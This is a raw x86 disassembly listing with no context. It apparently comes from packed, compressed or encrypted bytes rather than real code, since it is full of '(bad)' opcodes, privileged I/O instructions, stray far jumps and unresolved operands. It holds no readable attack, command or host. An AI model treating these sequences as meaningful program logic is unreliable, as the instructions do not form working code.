  4215f5:	out    dx,eax
  4215f6:	and    dh,BYTE PTR [esi+0x7f5cc389]
  4215fc:	je     0x42160c
  4215fe:	clc    
  4215ff:	iret   
  421600:	and    DWORD PTR [edx],edi
  421602:	repz fcomp DWORD PTR [ecx]
  421605:	xor    bl,BYTE PTR [eax]
  421607:	adc    BYTE PTR [ecx+0x45],0x7b
  42160b:	cmp    DWORD PTR [edi],esi
  42160d:	jnp    0x42165e
  42160f:	adc    al,0xaa
  421611:	fcmovb st,st(0)
  421613:	cld    
  421614:	xor    al,0x25
  421616:	out    0x4e,eax
  421618:	mov    eax,ds:0x71486885
  42161d:	or     ebp,DWORD PTR [esi+0x53]
  421620:	leave  
  421621:	mov    ah,0xf7
  421623:	inc    ebx
  421624:	push   ss
  421625:	jmp    0x5fb1:0xcde5bbe
  42162c:	jp     0x421673
  42162e:	jo     0x4215f3
  421630:	cmp    al,0x1c
  421632:	(bad)  
  421633:	lods   eax,DWORD PTR ds:[esi]
  421634:	sbb    DWORD PTR [edi],0x24552448
  42163a:	inc    edi
  42163b:	stos   DWORD PTR es:[edi],eax
  42163c:	sub    eax,0xb5f07160
  421641:	push   ecx
  421642:	inc    ecx
  421643:	dec    edi
  421644:	jp     0x421697
  421646:	mov    esp,0x3282bb53
  42164b:	adc    eax,DWORD PTR [edx+ebp*4+0x7]
  42164f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421650:	add    al,0x78
  421652:	push   ecx
  421653:	sbb    DWORD PTR [esi],ebp
  421655:	or     ecx,DWORD PTR [edx-0x65a6483f]
  42165b:	rol    BYTE PTR [ecx-0x78],0x1c
  42165f:	aam    0x21
  421661:	xchg   BYTE PTR [esi-0x32],ah
  421664:	jns    0x421668
  421666:	mov    edx,0x5ffe1de5
  42166b:	bound  esi,QWORD PTR [edi]
  42166d:	js     0x42167c
  42166f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421670:	push   esi
  421671:	cld    
  421672:	fisttp WORD PTR [edx-0x1a7d67ef]
  421678:	not    DWORD PTR [edi-0xb067775]
  42167e:	outs   dx,BYTE PTR ds:[esi]
  42167f:	mov    esp,0x9b3e06ef
  421684:	mov    BYTE PTR [ebp-0x4d01ae84],bh
  42168a:	mov    esi,0x9d5709ab
  42168f:	scas   al,BYTE PTR es:[edi]
  421690:	push   edx
  421691:	add    eax,DWORD PTR [edx-0x21]
  421694:	xor    DWORD PTR [esi-0x2b],ecx
  421697:	jecxz  0x421660
  421699:	(bad)  
  42169a:	sti    
  42169b:	je     0x42169a
  42169d:	cmp    edi,DWORD PTR [esp+ecx*2]
  4216a0:	adc    BYTE PTR [ecx],ah
  4216a2:	daa    
  4216a3:	cmp    DWORD PTR [edi],edi
  4216a5:	inc    ebp
  4216a6:	mov    ch,0xdd
  4216a8:	inc    esp
  4216a9:	xor    ah,0xe2
  4216ac:	aaa    
  4216ad:	mov    bl,0x46
  4216af:	rol    dl,0x51
  4216b2:	rcr    BYTE PTR [esi+edi*1],1
  4216b5:	(bad)  
  4216b6:	arpl   WORD PTR [edi],bp
  4216b8:	or     cl,al
  4216ba:	and    bl,ch
  4216bc:	sahf   
  4216bd:	in     eax,0x28
  4216bf:	xor    eax,0xac84079e
  4216c4:	jge    0x4216cb
  4216c6:	push   es
  4216c7:	call   FWORD PTR [eax+0x4cca5af]
  4216cd:	sar    BYTE PTR [edx],0xf
  4216d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216d1:	mov    DWORD PTR [ebx],0x8053c031
  4216d7:	xchg   DWORD PTR [ebp+0x35],edx
  4216da:	sub    eax,0x9117ce52
  4216df:	push   esp
  4216e0:	push   ecx
  4216e1:	hlt    
  4216e2:	push   esi
  4216e3:	rcl    DWORD PTR [esi],1
  4216e5:	fucom  st(7)
  4216e7:	mov    ds:0xeaeb8998,eax
  4216ec:	fcomp  st(4)
	...
  421756:	stos   DWORD PTR es:[edi],eax
  421757:	sub    al,0xed
  421759:	stos   BYTE PTR es:[edi],al
  42175a:	out    dx,eax
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	bound  eax,QWORD PTR [ebp+0x36]
  421765:	xor    BYTE PTR [edi+0x67],ah
  421768:	add    DWORD PTR [eax],eax
  42176a:	add    BYTE PTR [ecx],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	sub    BYTE PTR [edx+0x79d9b501],al
  421774:	jecxz  0x421709
  421776:	stos   BYTE PTR es:[edi],al
  421777:	lock cmc 
  421779:	loop   0x42170d
  42177b:	loopne 0x42174c
  42177d:	outs   dx,BYTE PTR ds:[esi]
  42177e:	out    dx,al
  42177f:	jmp    0x421701
  421781:	dec    esp
  421782:	pop    ebx
  421783:	xchg   ebx,eax
  421784:	mov    ds:0xc28fd024,eax
  421789:	mov    al,0x96
  42178b:	push   esi
  42178c:	cmp    eax,0x724f5292
  421791:	xchg   esp,eax
  421792:	fst    QWORD PTR [edi+eax*4-0x20]
  421796:	test   BYTE PTR [ebx-0x210f2810],0xf7
  42179d:	dec    esi
  42179e:	mov    ebp,0xf7eedecf
  4217a3:	dec    ebx
  4217a4:	and    ch,BYTE PTR [ebx]
  4217a6:	loope  0x421801
  4217a8:	cmp    ah,cl
  4217aa:	ss mov dl,0xd7
  4217ad:	mov    ebp,0x908f63d4
  4217b2:	(bad)  
  4217b3:	(bad)  
  4217b4:	test   DWORD PTR [ebp+0x39],edi
  4217b7:	pop    ecx
  4217b8:	add    DWORD PTR [eax],ecx
  4217ba:	cs mov esi,0xbc6e5587
  4217c0:	scas   al,BYTE PTR es:[edi]
  4217c1:	mov    ds:0x17e791ce,eax
  4217c6:	je     0x4217da
  4217c8:	(bad)  
  4217c9:	sbb    BYTE PTR [eax-0x502e0ddb],dl
  4217cf:	aaa    
  4217d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217d1:	pop    eax
  4217d2:	or     DWORD PTR [ebp+0x593e36f7],ebx
  4217d8:	push   ebx
  4217d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217da:	cmc    
  4217db:	push   eax
  4217dc:	cmp    eax,DWORD PTR [edx]
  4217de:	rol    ebp,1
  4217e0:	jmp    0x6c84d0b3
  4217e5:	xchg   esi,eax
  4217e6:	cmc    
  4217e7:	pushf  
  4217e8:	loope  0x421790
  4217ea:	iret   
  4217eb:	xchg   DWORD PTR [edx+0x64],eax
  4217ee:	cdq    
  4217ef:	jmp    0x4217f3
  4217f1:	retf   0xfcbc
  4217f4:	arpl   WORD PTR [esi+0x70cb8228],di
  4217fa:	pop    eax
  4217fb:	push   ebx
  4217fc:	into   
  4217fd:	ret    
  4217fe:	lods   al,BYTE PTR ds:[esi]
  4217ff:	icebp  
  421800:	inc    edx
  421801:	nop
  421802:	xchg   edi,eax
  421803:	ins    DWORD PTR es:[edi],dx
  421804:	cdq    
  421805:	or     DWORD PTR es:[ecx-0x80],ecx
  421809:	pushf  
  42180a:	pop    edx
  42180b:	jnp    0x4217ba
  42180d:	and    bh,BYTE PTR [edx]
  42180f:	bound  edi,QWORD PTR [ebx+0x50]
  421812:	dec    esp
  421813:	mov    ebp,eax
  421815:	test   BYTE PTR [eax],al
  421817:	jb     0x421815
  421819:	sbb    BYTE PTR [eax+ecx*1],ah
  42181c:	fild   WORD PTR [edx+0x62]
  42181f:	loope  0x421843
  421821:	scas   al,BYTE PTR es:[edi]
  421822:	leave  
  421823:	and    eax,ebx
  421825:	into   
  421826:	out    dx,eax
  421827:	pop    di
  421829:	pop    ebp
  42182a:	popf   
  42182b:	enter  0xf7d,0x10
  42182f:	scas   eax,DWORD PTR es:[edi]
  421830:	cmp    eax,0x51cfae85
  421835:	fist   WORD PTR [ecx+0x61]
  421838:	iret   
  421839:	mov    ds:0x8429017e,eax
  42183e:	cld    
  42183f:	jae    0x42182c
  421841:	adc    al,0x2d
  421843:	cmp    BYTE PTR [esi],dh
  421845:	or     dl,ah
  421847:	adc    DWORD PTR [ebp-0x6aabd5d4],ebx
  42184d:	aas    
  42184e:	xchg   edi,eax
  42184f:	inc    edx
  421850:	dec    edi
  421851:	push   ecx
  421852:	xlat   BYTE PTR ds:[ebx]
  421853:	shl    BYTE PTR [ebp-0x7363853c],cl
  421859:	mov    cs,WORD PTR [ecx]
  42185b:	mov    ecx,0x5de8e381
  421860:	sbb    ebx,edx
  421862:	pusha  
  421863:	and    BYTE PTR [eax],ah
  421865:	(bad)  ds:0x4b3af219
  42186b:	mov    bh,0x7d
  42186d:	xchg   edi,eax
	...
  4218d6:	shl    DWORD PTR [eax-0x6061f47],1
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	shl    bl,1
  4218e4:	push   ecx
  4218e5:	xchg   BYTE PTR [edi+0x68],ah
  4218e8:	add    DWORD PTR [eax],eax
  4218ea:	add    BYTE PTR [ecx],al
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	imul   BYTE PTR [ecx]
  4218f0:	pop    es
  4218f1:	in     eax,0xe
  4218f3:	loop   0x4218b0
  4218f5:	jns    0x42193f
  4218f7:	pop    ss
  4218f8:	pop    fs
  4218fa:	jae    0x42192b
  4218fc:	or     cl,al
  4218fe:	pusha  
  4218ff:	dec    ebp
  421900:	shl    BYTE PTR [ebx],cl
  421902:	aad    0xf8
  421904:	fstp   st(0)
  421906:	js     0x42192c
  421908:	out    dx,eax
  421909:	(bad)  
  42190a:	iret   
  42190b:	mov    WORD PTR [ecx+0x4c],?
  42190e:	mov    ss,edx
  421910:	aam    0x46
  421912:	mov    dl,0x43
  421914:	shl    cl,0x6
  421917:	icebp  
  421918:	mov    al,0x8d
  42191a:	push   edx
  42191b:	pop    edx
  42191c:	pop    esi
  42191d:	adc    DWORD PTR [ebp-0x27],0x7a
  421921:	stos   BYTE PTR es:[edi],al
  421922:	in     al,0xff
  421924:	sbb    DWORD PTR [ebx],edx
  421926:	mov    ebp,0xd9f9146c
  42192b:	mov    ah,0xc1
  42192d:	aad    0xf8
  42192f:	pushf  
  421930:	dec    esp
  421931:	sub    DWORD PTR [ecx+eax*2],0xffffffd8
  421935:	mov    BYTE PTR [ecx-0x5897edaf],bl
  42193b:	fmul   DWORD PTR [edi]
  42193d:	popa   
  42193e:	ja     0x4219a2
  421940:	or     dl,BYTE PTR [esi]
  421942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421944:	xchg   ebp,eax
  421945:	jnp    0x42197f
  421947:	in     al,0xfe
  421949:	dec    esp
  42194a:	mov    eax,ds:0xc73c8c74
  42194f:	adc    al,0x44
  421951:	mov    ?,WORD PTR [esi+0x4d]
  421954:	mov    eax,ds:0xf7c4a581
  421959:	pop    esi
  42195a:	adc    edi,DWORD PTR [edx+eax*4-0x6]
  42195e:	test   eax,0x3beea524
  421963:	mov    BYTE PTR [ebp+ebx*4-0x48e07906],ah
  42196a:	mov    dl,BYTE PTR [ebx+0x15]
  42196d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42196e:	sub    eax,0x33b6e4bf
  421973:	fcom   QWORD PTR [ebx]
  421975:	jle    0x4219cf
  421977:	xor    eax,0xbbd6ed90
  42197c:	repnz mov dl,0x9
  42197f:	fmulp  st(2),st
  421981:	enter  0xb34f,0x18
  421985:	push   es
  421986:	adc    ch,0x36
  421989:	fdivp  st(4),st
  42198b:	sub    eax,0xbc11bac8
  421990:	jmp    0x147b1625
  421995:	aas    
  421996:	mov    esp,0x9f3b988b
  42199b:	pop    ebp
  42199c:	or     BYTE PTR [ecx],cl
  42199e:	adc    ecx,eax
  4219a0:	data16 cmp BYTE PTR [ecx-0x1113c0e1],dh
  4219a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219a8:	add    DWORD PTR [edi],eax
  4219aa:	inc    edi
  4219ab:	call   0xe470fab
  4219b0:	sbb    eax,0xe561a622
  4219b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219b6:	inc    eax
  4219b7:	out    0x9c,al
  4219b9:	daa    
  4219ba:	les    eax,FWORD PTR [ebx+0x6ec45f22]
  4219c0:	fcomp  st(6)
  4219c2:	and    eax,0xc3afd4c
  4219c7:	xchg   DWORD PTR ds:0x3fd70968,esi
  4219cd:	xor    cl,ah
  4219cf:	dec    ebp
  4219d0:	inc    ebx
  4219d1:	mov    ebx,ebx
  4219d3:	pusha  
  4219d4:	rcl    BYTE PTR [ebx+0x7f],cl
  4219d7:	dec    esp
  4219d8:	cmp    DWORD PTR [eax-0x28ade45],ecx
  4219de:	iret   
  4219df:	ins    BYTE PTR es:[edi],dx
  4219e0:	loope  0x4219a6
  4219e2:	sbb    cl,BYTE PTR [ebx+0x4aa2e5e1]
  4219e8:	loop   0x421a0c
  4219ea:	xchg   edi,eax
  4219eb:	mov    BYTE PTR [eax+0xa5],0x0
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	pop    esp
  421a63:	daa    
  421a64:	jp     0x421ad0
  421a66:	imul   eax,DWORD PTR [bx+di],0x10000
  421a6d:	add    BYTE PTR [eax+0x36],ch
  421a70:	imul   ecx,DWORD PTR [edx],0x32ba68d
  421a76:	stos   BYTE PTR es:[edi],al
  421a77:	sbb    eax,0xfe0fd023
  421a7c:	pop    ds
  421a7d:	aam    0x80
  421a7f:	xor    dl,bh
  421a81:	cmp    bl,dl
  421a83:	xchg   DWORD PTR [ecx],esi
  421a85:	ficom  WORD PTR [edx]
  421a87:	cmp    ecx,DWORD PTR [ebx+eiz*8]
  421a8a:	xor    cl,BYTE PTR [eax+edx*4]
  421a8d:	stos   DWORD PTR es:[edi],eax
  421a8e:	xchg   ebp,eax
  421a8f:	inc    eax
  421a90:	daa    
  421a91:	cmp    BYTE PTR [eax-0x3295b4b7],bh
  421a97:	sub    DWORD PTR [ecx+0x47382b4],esp
  421a9d:	sbb    esp,DWORD PTR [eax+0x75f3fbf0]
  421aa3:	jle    0x421ac1
  421aa5:	call   0x386b6806
  421aaa:	lods   eax,DWORD PTR ds:[esi]
  421aab:	adc    esi,edx
  421aad:	pop    es
  421aae:	iret   
  421aaf:	test   al,cl
  421ab1:	push   esi
  421ab2:	add    DWORD PTR [eax+0x6a],esp
  421ab5:	jp     0x421aed
  421ab7:	or     eax,0xad1de7f
  421abc:	std    
  421abd:	call   0x6d7f:0xfb117720
  421ac4:	xchg   ebx,eax
  421ac5:	repz push cs
  421ac7:	push   0x5a
  421ac9:	rcr    DWORD PTR [ecx+esi*1-0x601aca39],cl
  421ad0:	fldenv [edx-0x4e37454e]
  421ad6:	pop    eax
  421ad7:	sbb    al,0x6f
  421ad9:	les    esp,FWORD PTR [eax-0x80]
  421adc:	mov    ecx,0xc028774f
  421ae1:	clc    
  421ae2:	daa    
  421ae3:	imul   ecx,DWORD PTR [edi],0x891a818c
  421ae9:	or     bl,BYTE PTR [edx+ebp*2-0x9]
  421aed:	add    eax,ebx
  421aef:	add    eax,0x33982eaa
  421af4:	mov    ecx,0xd3a0fd2
  421af9:	or     BYTE PTR [ecx-0x20],bh
  421afc:	jle    0x421ac8
  421afe:	push   edi
  421aff:	ds jmp 0x421b23
  421b02:	dec    eax
  421b03:	cmp    eax,DWORD PTR [esi+0x5c]
  421b06:	fistp  WORD PTR [esi]
  421b08:	inc    BYTE PTR [ebx+0x795e4d22]
  421b0e:	adc    dh,BYTE PTR [ecx]
  421b10:	mov    WORD PTR [ebp+0x2a],?
  421b13:	mov    ebp,DWORD PTR [eax+0x54]
  421b16:	gs mov cl,0x91
  421b19:	out    dx,eax
  421b1a:	ins    BYTE PTR es:[edi],dx
  421b1b:	mov    ds:0x8c6680d4,eax
  421b20:	arpl   WORD PTR fs:[ebx+0x38cc689e],sp
  421b27:	jno    0x421b09
  421b29:	xor    edi,DWORD PTR [bp+di]
  421b2c:	jmp    0x421ae1
  421b2e:	push   0x25bc9c18
  421b33:	ins    DWORD PTR es:[edi],dx
  421b34:	jg     0x421b87
  421b36:	std    
  421b37:	push   es
  421b38:	shl    BYTE PTR [edx+edx*8-0x2061c9c4],1
  421b3f:	xor    al,0xb4
  421b41:	add    DWORD PTR [ecx+ebx*2],esp
  421b44:	inc    ebx
  421b45:	(bad)  
  421b46:	mov    edx,0x4a32ecc3
  421b4b:	lds    edi,FWORD PTR [edi+0x310c5]
  421b51:	push   eax
  421b52:	pop    ss
  421b53:	daa    
  421b54:	sub    DWORD PTR [edx-0x2c934846],edx
  421b5a:	mov    dh,0x2a
  421b5c:	cmp    eax,0xcd97ec2d
  421b61:	dec    esp
  421b62:	xchg   edi,eax
  421b63:	fwait
  421b64:	call   0xadd50579
  421b69:	or     eax,0xc44f86ff
	...
  421bd6:	push   ss
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     dl,BYTE PTR [edx]
  421be3:	lahf   
  421be4:	sar    ebx,cl
  421be6:	addr16 push 0x1
  421be9:	add    BYTE PTR [eax],al
  421beb:	add    DWORD PTR [eax],eax
  421bed:	add    BYTE PTR [edi+eiz*2],dh
  421bf0:	inc    esi
  421bf1:	mov    ebp,0x2e9cf26c
  421bf6:	and    al,0x1e
  421bf8:	adc    BYTE PTR [ecx],al
  421bfa:	in     al,dx
  421bfb:	icebp  
  421bfc:	iret   
  421bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bfe:	loopne 0x421c4b
  421c00:	out    0x70,al
  421c02:	fwait
  421c03:	xchg   esi,eax
  421c04:	adc    bl,BYTE PTR [ebp-0x19]
  421c07:	lods   al,BYTE PTR ds:[esi]
  421c08:	pop    ss
  421c09:	lahf   
  421c0a:	sar    BYTE PTR [bx-0x1ed7],1
  421c0f:	lock adc eax,DWORD PTR ds:0x840a5d7
  421c16:	dec    esi
  421c17:	cmp    BYTE PTR es:[eax-0x3918a6f5],ch
  421c1e:	sbb    DWORD PTR [edx],0x7d
  421c21:	test   al,0x6c
  421c23:	(bad)  
  421c24:	repnz xor cl,BYTE PTR [edi]
  421c27:	sbb    DWORD PTR [esi],esp
  421c29:	neg    BYTE PTR [ecx+0x33af38aa]
  421c2f:	outs   dx,BYTE PTR ds:[esi]
  421c30:	xchg   DWORD PTR fs:[esi+0x74],eax
  421c34:	mov    al,0xca
  421c36:	mov    ds:0xfd9e280c,eax
  421c3b:	ror    DWORD PTR [edi],cl
  421c3d:	in     al,0x4d
  421c3f:	popf   
  421c40:	aam    0x21
  421c42:	loop   0x421c61
  421c44:	dec    ch
  421c46:	call   0x783a5804
  421c4b:	sub    DWORD PTR [esi-0xa165a21],ebx
  421c51:	inc    edx
  421c52:	sbb    edx,DWORD PTR [eax]
  421c54:	sahf   
  421c55:	sbb    eax,0xe76517a5
  421c5a:	mov    esi,0xde327155
  421c5f:	inc    esp
  421c60:	in     eax,dx
  421c61:	cs sub eax,0x6d4b89a8
  421c67:	pusha  
  421c68:	fidivr DWORD PTR [edx]
  421c6a:	jb     0x421c67
  421c6c:	or     bh,BYTE PTR [ebp-0x36]
  421c6f:	pop    eax
  421c70:	int3   
  421c71:	std    
  421c72:	xor    bl,ah
  421c74:	loopne 0x421c70
  421c76:	pop    ecx
  421c77:	into   
  421c78:	jbe    0x421c10
  421c7a:	loope  0x421c93
  421c7c:	jae    0x421c09
  421c7e:	in     al,0x81
  421c80:	xchg   ebp,eax
  421c81:	out    dx,al
  421c82:	xchg   bl,dl
  421c84:	mov    ds:0x2e57cec6,al
  421c89:	pop    ecx
  421c8a:	mov    edx,0x1443a4aa
  421c8f:	and    dh,al
  421c91:	jp     0x421c56
  421c93:	mov    ch,0x3f
  421c95:	add    BYTE PTR [eax],dh
  421c97:	push   ebp
  421c98:	test   DWORD PTR [eax],ebx
  421c9a:	jmp    0x98d:0x8a63f784
  421ca1:	fiadd  WORD PTR [esi-0x40213e14]
  421ca7:	popf   
  421ca8:	push   edi
  421ca9:	cmp    eax,0x2549e0ea
  421cae:	and    BYTE PTR [ebx-0x2d],ch
  421cb1:	cmp    edx,DWORD PTR [esi]
  421cb3:	and    DWORD PTR [esi+0x76ce140a],esp
  421cb9:	cmp    esi,DWORD PTR [esi+0x726f795c]
  421cbf:	add    al,0xf2
  421cc1:	in     eax,0x97
  421cc3:	iret   
  421cc4:	scas   eax,DWORD PTR es:[edi]
  421cc5:	sahf   
  421cc6:	loopne 0x421d0d
  421cc8:	or     al,0x33
  421cca:	(bad)  
  421ccb:	imul   ebp,DWORD PTR [ecx],0x14d11577
  421cd1:	adc    eax,0xafa7c42e
  421cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cd7:	test   al,0x10
  421cd9:	outs   dx,DWORD PTR ds:[esi]
  421cda:	sub    eax,0xb9624c19
  421cdf:	add    DWORD PTR [esi],0x2647a215
  421ce5:	pop    esp
  421ce6:	adc    bl,BYTE PTR [eax-0x65]
  421ce9:	pop    es
  421cea:	outs   dx,BYTE PTR ds:[esi]
  421ceb:	jmp    0x421cd7
  421ced:	aad    0x0
	...
  421d53:	add    BYTE PTR [eax],al
  421d55:	add    BYTE PTR [eax-0x1a4a95],dh
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	hlt    
  421d63:	outs   dx,BYTE PTR ds:[esi]
  421d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d65:	imul   esp,DWORD PTR [edi+0x6b],0x1000001
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	sub    eax,0xa2fcf0c7
  421d73:	out    dx,al
  421d74:	push   es
  421d75:	(bad)  
  421d76:	push   0x5918907b
  421d7b:	(bad)  
  421d7c:	mov    ebp,0x91fec63f
  421d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d82:	mov    bl,0x15
  421d84:	and    DWORD PTR [ebp+0x68],ebx
  421d87:	scas   al,BYTE PTR es:[edi]
  421d88:	pop    es
  421d89:	in     eax,dx
  421d8a:	call   0x358d:0x71dcc8c3
  421d91:	inc    ebx
  421d92:	xlat   BYTE PTR ds:[ebx]
  421d93:	fisttp WORD PTR [eax-0x7455ff4b]
  421d99:	bnd jge 0x421d9d
  421d9c:	je     0x421df3
  421d9e:	ins    DWORD PTR es:[edi],dx
  421d9f:	in     eax,dx
  421da0:	jns    0x421dfe
  421da2:	in     eax,dx
  421da3:	or     ch,BYTE PTR [esi-0xa3f6ce5]
  421da9:	pop    esi
  421daa:	cmp    dh,ah
  421dac:	sub    DWORD PTR [edx-0x56bbacf6],esp
  421db2:	sbb    al,dl
  421db4:	call   0xce17eb88
  421db9:	test   ch,0xc4
  421dbc:	je     0x421df7
  421dbe:	adc    al,0xb
  421dc0:	mov    cl,0x34
  421dc2:	pusha  
  421dc3:	imul   ecx,edx,0x3e
  421dc6:	xor    ecx,DWORD PTR [esi-0x7d]
  421dc9:	(bad)  
  421dca:	inc    ebx
  421dcb:	mov    ah,0x55
  421dcd:	cmp    al,0xa8
  421dcf:	ja     0x421def
  421dd1:	fild   WORD PTR [esi]
  421dd3:	bswap  eax
  421dd5:	in     al,dx
  421dd6:	popf   
  421dd7:	fidivr DWORD PTR [ecx]
  421dd9:	addr16 xor edx,0x9d07bb0b
  421de0:	sbb    eax,0x2f63e112
  421de5:	test   BYTE PTR [ebx+ebx*1-0x35],bh
  421de9:	push   ds
  421dea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421deb:	xor    ebx,DWORD PTR cs:[eax]
  421dee:	inc    esi
  421def:	mov    eax,0x1c5f8d38
  421df4:	test   al,0x31
  421df6:	(bad)  
  421df7:	pop    edx
  421df8:	mov    bl,0x46
  421dfa:	js     0x421dc8
  421dfc:	aad    0x92
  421dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dff:	sbb    DWORD PTR [bp+si],esp
  421e02:	inc    edx
  421e03:	dec    ecx
  421e04:	pop    eax
  421e05:	xlat   BYTE PTR ds:[ebx]
  421e06:	add    ebp,ebp
  421e08:	sub    eax,0x889158ec
  421e0d:	jp     0x421e17
  421e0f:	mov    ebp,0x2451c2f2
  421e14:	(bad)  
  421e15:	xchg   esi,eax
  421e16:	fstp   DWORD PTR [ecx]
  421e18:	fwait
  421e19:	push   esi
  421e1a:	mov    ah,0x4d
  421e1c:	jae    0x421e74
  421e1e:	std    
  421e1f:	scas   eax,DWORD PTR es:[edi]
  421e20:	inc    ebp
  421e21:	aad    0xcb
  421e23:	jmp    0xddc685cd
  421e28:	aas    
  421e29:	xchg   BYTE PTR gs:[ebx-0x2a],bh
  421e2d:	push   es
  421e2e:	push   ebp
  421e2f:	add    bl,BYTE PTR [eax+0x67a4a02d]
  421e35:	imul   edx,DWORD PTR ds:0x60203698,0xcb0fad73
  421e3f:	in     al,0xfd
  421e41:	rcr    BYTE PTR [ebp-0x76],1
  421e44:	xlat   BYTE PTR ds:[ebx]
  421e45:	enter  0x778b,0xab
  421e49:	add    DWORD PTR [ebx-0x15],ebx
  421e4c:	pop    es
  421e4d:	cmp    BYTE PTR [eax+0xb],dl
  421e50:	enter  0xd8,0xc1
  421e54:	inc    edi
  421e56:	jle    0x421e96
  421e58:	mov    ecx,DWORD PTR [esi+0x44087a27]
  421e5e:	retf   
  421e5f:	lahf   
  421e60:	inc    edx
  421e61:	mov    bl,BYTE PTR ds:0xa1b22741
  421e67:	sbb    DWORD PTR [eax],esi
  421e69:	mov    ebp,0x93e7133b
	...
  421ed6:	iret   
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	sbb    eax,0x6742ea77
  421ee7:	ins    BYTE PTR es:[edi],dx
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	cmp    BYTE PTR [ebp+0x6d],dh
  421ef1:	test   al,0x49
  421ef3:	jmp    0x421eef
  421ef5:	cmp    eax,0x1e344d1
  421efa:	mov    edi,0x1ee7b362
  421eff:	sbb    edx,edi
  421f01:	jp     0x421ed4
  421f03:	mov    ds,WORD PTR [ebp-0x78]
  421f06:	leave  
  421f07:	pop    esi
  421f08:	sbb    ah,BYTE PTR [edi+0x7389fd6a]
  421f0e:	jp     0x421f02
  421f10:	and    esi,edx
  421f12:	(bad)  
  421f14:	lods   al,BYTE PTR ds:[esi]
  421f15:	je     0x421f0c
  421f17:	sub    ebp,DWORD PTR [edi+0x4e3c5de0]
  421f1d:	out    dx,eax
  421f1e:	cmc    
  421f1f:	add    DWORD PTR [edi],edx
  421f21:	fist   DWORD PTR [ebx]
  421f23:	fst    DWORD PTR [esi+0x7d086010]
  421f29:	pop    esi
  421f2a:	repz inc edi
  421f2c:	hlt    
  421f2d:	fidiv  DWORD PTR [edi-0x3a1af82d]
  421f33:	mov    cl,bl
  421f35:	(bad)  
  421f36:	dec    ebx
  421f37:	or     BYTE PTR [edi],cl
  421f39:	mov    esi,0xb363c894
  421f3e:	add    DWORD PTR [ecx+0x5b],esp
  421f41:	xlat   BYTE PTR ds:[ebx]
  421f42:	call   0xb65f:0x3793e730
  421f49:	aaa    
  421f4a:	fmul   QWORD PTR [ecx+0x7d]
  421f4d:	sar    DWORD PTR [esi+0x8bbd5ba],1
  421f53:	or     eax,0xd8006bb3
  421f58:	cmp    bl,al
  421f5a:	mov    edi,0x8e69c4d8
  421f5f:	jmp    0xf5c7:0x8b109e20
  421f66:	and    DWORD PTR [eax],eax
  421f68:	stos   BYTE PTR es:[edi],al
  421f69:	arpl   WORD PTR [edx+0x54783685],sp
  421f6f:	mov    eax,ds:0x394cab36
  421f74:	sbb    DWORD PTR [edi+0x21],edi
  421f77:	push   ss
  421f78:	xor    BYTE PTR [eax+0x56],ch
  421f7b:	cmp    DWORD PTR [edx-0x2f],edx
  421f7e:	mov    cl,0x1
  421f80:	shl    BYTE PTR [edi+0x18fdff5e],1
  421f86:	(bad)  
  421f87:	call   0xc9c7:0xcf95764e
  421f8e:	fcomp  DWORD PTR [edi]
  421f90:	mov    bl,0xb
  421f92:	jb     0x421ffc
  421f94:	jg     0x421f5a
  421f96:	sbb    edi,DWORD PTR [eax+0x434ff6f1]
  421f9c:	adc    al,0x54
  421f9e:	dec    edi
  421f9f:	adc    ebx,DWORD PTR [ebx]
  421fa1:	and    eax,0x36125d14
  421fa6:	addr16 loope 0x421fad
  421fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421faa:	mov    al,ds:0x50c299ca
  421faf:	push   DWORD PTR [esp+eax*1-0x6f]
  421fb3:	cli    
  421fb4:	jno    0x42202d
  421fb6:	bound  eax,QWORD PTR [ebx]
  421fb8:	cld    
  421fb9:	idiv   BYTE PTR [esi-0x4a]
  421fbc:	aaa    
  421fbd:	icebp  
  421fbe:	stos   BYTE PTR es:[edi],al
  421fbf:	cmp    dl,ch
  421fc1:	dec    ebx
  421fc2:	out    dx,eax
  421fc3:	test   BYTE PTR [eax],ch
  421fc5:	mov    ch,0x87
  421fc7:	(bad)  
  421fc8:	push   ecx
  421fc9:	xchg   edx,eax
  421fca:	add    cl,cl
  421fcc:	pop    esi
  421fcd:	mov    edi,0x4234eb34
  421fd2:	xlat   BYTE PTR ds:[ebx]
  421fd3:	sar    bl,0xba
  421fd6:	pop    ebp
  421fd7:	or     BYTE PTR [edi+0x3c],ah
  421fda:	push   ebp
